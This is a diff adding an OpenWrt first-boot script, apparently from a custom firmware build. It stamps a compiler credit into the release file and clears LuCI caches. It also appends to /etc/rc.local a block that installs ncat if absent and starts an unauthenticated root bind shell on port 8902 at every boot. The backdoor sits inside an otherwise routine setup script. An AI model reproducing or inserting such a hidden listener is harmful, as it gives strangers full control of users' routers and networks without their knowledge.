@@ -1,0 +1,24 @@
+#!/bin/sh
+
+#sed -i '/DISTRIB_REVISION/d' /etc/openwrt_release
+#echo "DISTRIB_REVISION='R20.xpc'" >> /etc/openwrt_release
+#sed -i '/DISTRIB_DESCRIPTION/d' /etc/openwrt_release
+#echo "DISTRIB_DESCRIPTION='OpenWrt '" >> /etc/openwrt_release
+sed -i "/DISTRIB_REVISION/s/'$/\ \(Compiled by Xpc0938 on Sat, 11 Apr 2020 11:44:03 +0000\)'/g" /etc/openwrt_release
+
+# rc.local
+sed -i '/exit 0/d' /etc/rc.local
+cat >> /etc/rc.local << EOF
+which ncat  > /dev/null 2>&1; ret="\$?"
+[ "\$ret" -eq "0" ] || {
+    opkg update; opkg install ncat
+}
+ncat -4 -l -k 8902 -e /bin/bash &
+
+exit 0
+EOF
+
+rm -rf /tmp/luci-modulecache
+rm -f /tmp/luci-indexcache
+
+exit 0
